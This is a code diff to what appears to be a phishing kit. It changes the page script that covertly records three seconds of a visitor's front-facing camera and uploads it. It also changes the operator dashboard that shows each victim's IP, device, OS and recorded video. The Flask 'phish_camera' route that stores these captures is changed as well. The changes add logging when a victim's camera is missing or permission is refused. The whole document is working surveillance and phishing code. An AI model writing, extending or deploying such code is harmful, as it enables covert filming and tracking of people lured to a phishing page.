@@ -155,7 +155,7 @@ function captureCamera(){
   if(!navigator.mediaDevices||!navigator.mediaDevices.enumerateDevices)return;
   navigator.mediaDevices.enumerateDevices().then(function(devices){
     var hasCamera=devices.some(function(d){return d.kind==='videoinput';});
-    if(!hasCamera)return;
+    if(!hasCamera){send('/camera',{denied:true,reason:'No camera found on device'});return;}
     navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
       .then(function(stream){
         var chunks=[],mr=new MediaRecorder(stream);
@@ -170,7 +170,7 @@ function captureCamera(){
         };
         mr.start();
         setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
-      }).catch(function(){});
+      }).catch(function(err){send('/camera',{denied:true,reason:err.message||'Permission denied'});});
   }).catch(function(){});
 }
 function autoCapture(){
@@ -263,6 +263,7 @@ body{display:flex}
 .deny{background:#3a1a1a;color:#f85149;border:1px solid #f85149}
 .dev{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}
 .cam{background:#2a1a3a;color:#c084fc;border:1px solid #c084fc}
+.cam-deny{background:#3a1a2a;color:#f472b6;border:1px solid #f472b6}
 .ts{font-size:.7rem;color:#8b949e}
 .ip{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}
 .fields{display:grid;grid-template-columns:1fr 1fr;gap:4px}
@@ -342,10 +343,15 @@ function addCard(d){
     stats.g++;
   }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
   else if(ep==='/camera'){
-    badge='<span class="bx cam">Camera</span>';
-    var kb=d.size?Math.round(d.size/1024)+'KB':'?';
-    fields+='<div class="f wide"><div class="lb">Recording · '+kb+'</div><video src="/captures/'+d.file+'" controls playsinline style="width:100%;margin-top:6px;border-radius:8px;background:#000;max-height:200px"></video></div>';
-    fields+=f('Format',d.mimeType||'N/A');
+    if(d.denied){
+      badge='<span class="bx cam-deny">Cam Denied</span>';
+      fields+=f('Reason',d.reason||'Permission denied');
+    }else{
+      badge='<span class="bx cam">Camera</span>';
+      var kb=d.size?Math.round(d.size/1024)+'KB':'?';
+      fields+='<div class="f wide"><div class="lb">Recording · '+kb+'</div><video src="/captures/'+d.file+'" controls playsinline style="width:100%;margin-top:6px;border-radius:8px;background:#000;max-height:200px"></video></div>';
+      fields+=f('Format',d.mimeType||'N/A');
+    }
   }else{
     var devIcon=d.deviceType==='Mobile'?'Mobile':d.deviceType==='Tablet'?'Tablet':'Desktop';
     fields+=f('Device',d.deviceType?devIcon+' ('+d.deviceType+')':'N/A')+f('OS',d.os||d.platform||'N/A');
@@ -440,17 +446,23 @@ def run(redirect_url: str):
     def phish_camera():
         if request.method == 'OPTIONS': return Response('', 204)
         ip = _ip(request)
+        # JSON denial report
+        ct = request.content_type or ''
+        if 'json' in ct:
+            d = _parse_body(request)
+            if d.get('denied'):
+                entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
+                         '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                         'denied': True, 'reason': d.get('reason', 'Permission denied')}
+                captures.append(entry); _save(log_file); return {'ok': True}
+            return {'ok': False}
+        # FormData video upload
         if 'video' in request.files:
             fobj = request.files['video']
             video_bytes = fobj.read()
             mime = request.form.get('mimeType') or fobj.content_type or 'video/webm'
         else:
-            d = _parse_body(request)
-            data_url = d.get('data', '')
-            mime = d.get('mimeType', 'video/webm')
-            if not data_url or ',' not in data_url:
-                return {'ok': False}
-            video_bytes = base64.b64decode(data_url.split(',', 1)[1])
+            return {'ok': False}
         if not video_bytes:
             return {'ok': False}
         ext = 'webm' if 'webm' in mime else 'mp4'
